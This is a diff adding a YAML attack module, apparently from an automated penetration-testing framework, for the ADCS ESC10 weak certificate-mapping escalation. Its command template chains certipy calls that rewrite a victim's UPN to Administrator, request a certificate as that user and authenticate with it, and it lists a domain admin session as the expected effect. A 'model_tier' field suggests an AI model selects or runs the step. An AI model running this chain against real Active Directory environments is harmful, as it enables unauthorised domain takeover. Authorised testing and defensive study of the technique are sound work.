@@ -1,0 +1,39 @@
+name: adcs_esc10
+category: ad
+description: ADCS ESC10 — weak Kerberos cert mapping (StrongCertificateBindingEnforcement)
+preconditions:
+- has_cred
+- service.port==445
+- write_access_upn
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  ca: from_engagement.ca
+  victim: from_engagement.victim_user
+command_template: certipy account update -u {username}@{domain} -p '{password}' -user
+  '{victim}' -upn Administrator && certipy req -u '{victim}@{domain}' -p '{password}'
+  -ca '{ca}' -template User -dc-ip {target_ip} && certipy auth -pfx administrator.pfx
+  -domain {domain}
+parser: generic_parser
+expected_effects:
+- certificate_obtained
+- domain_admin_session
+- has_cred
+falsifier:
+  pattern: STRONG_BINDING|CERTIFICATE_MAPPING|ACCESS_DENIED
+  timeout: 120
+model_tier: sonnet
+mechanism: 'When DC registry StrongCertificateBindingEnforcement=0 (or CertificateMappingMethods
+
+  allows UPN), Kerberos maps cert to principal by UPN alone. Same mechanic as ESC9
+
+  but triggered by DC-side config rather than template flag. May be default pre-May
+  2022.
+
+  '
+references:
+  ocd_mindmap: 'Branch 7: ADCS ESC10 (weak cert mapping)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
